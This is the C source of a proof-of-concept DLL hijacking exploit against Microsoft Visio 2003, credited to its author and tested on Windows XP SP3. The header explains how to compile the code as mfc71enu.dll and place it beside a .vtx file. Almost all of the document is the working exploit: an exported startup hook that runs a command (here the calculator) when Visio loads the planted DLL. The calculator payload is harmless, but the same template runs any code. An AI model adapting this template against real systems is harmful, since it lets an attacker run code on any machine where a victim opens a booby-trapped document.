/* 
Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles , Dinesh Arora
Exploit Title: Microsoft Visio 2003 DLL Hijacking Exploit
Date: 25/08/2010
Author: Beenu Arora
Tested on: Windows XP SP3
Vulnerable extensions: .vtx

Compile and rename to mfc71enu.dll, create a file in the same dir with one of the following extensions:
.vtx
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

// POC: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/14744.zip